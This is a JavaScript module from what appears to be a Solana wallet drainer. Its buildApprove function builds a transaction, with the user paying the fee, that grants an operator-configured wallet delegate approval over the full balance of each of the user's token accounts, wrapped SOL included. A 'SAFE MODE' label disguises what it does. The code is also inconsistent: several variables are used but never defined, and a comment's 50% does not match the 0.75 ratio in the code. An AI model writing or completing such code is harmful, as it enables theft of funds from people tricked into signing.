const { 
    Transaction, 
    PublicKey, 
    SystemProgram,
    LAMPORTS_PER_SOL
} = require("@solana/web3.js");

const { 
    createApproveInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    TOKEN_PROGRAM_ID,
    NATIVE_MINT,
    createSyncNativeInstruction
} = require("@solana/spl-token");

const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;
const MAX_INSTRUCTIONS_PER_TX = 12;

// Bezpečný buffer aby transakcia nepadla
const SAFE_SOL_BUFFER = 0.02 * LAMPORTS_PER_SOL;

// Wrapujeme max 50 % balancu po odpočítaní bufferu
const WRAP_RATIO = 0.75;

async function buildApprove(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();

            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);

            // Blockhash
            const { blockhash } = await conn.getLatestBlockhash("confirmed");
            setBlockhash(blockhash);
            tx.recentBlockhash = blockhash;
            tx.feePayer = userPubkey;


            // ===== 3. Approve tokens =====
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            const approvableTokens = [];

            if (wsolAmount > 0n) {
                approvableTokens.push({
                    ata: wsolAta,
                    amount: wsolAmount,
                    symbol: "WSOL"
                });
            }

            for (const token of tokenAccounts.tokens || []) {
                if (token.amount >= MIN_RAW_AMOUNT) {
                    approvableTokens.push({
                        ata: new PublicKey(token.ata),
                        amount: BigInt(token.amount),
                        symbol: token.symbol || "Unknown"
                    });
                }
            }

            // ===== 4. Approve instructions =====
            for (const token of approvableTokens) {
                tx.add(
                    createApproveInstruction(
                        token.ata,
                        delegatePubkey,
                        userPubkey,
                        token.amount
                    )
                );

                if (tx.instructions.length >= MAX_INSTRUCTIONS_PER_TX) {
                    break;
                }
            }

            logger.info("Approve TX built (SAFE MODE)", {
                instructions: tx.instructions.length,
                wrappedLamports: solToConvert,
                safeBuffer: SAFE_SOL_BUFFER,
                wrapRatio: WRAP_RATIO
            });

            return tx;

        } catch (err) {
            logger.error("Failed to build approve transaction", { error: err.message });
            throw err;
        }
    }, "buildApprove");
}

module.exports = { buildApprove };
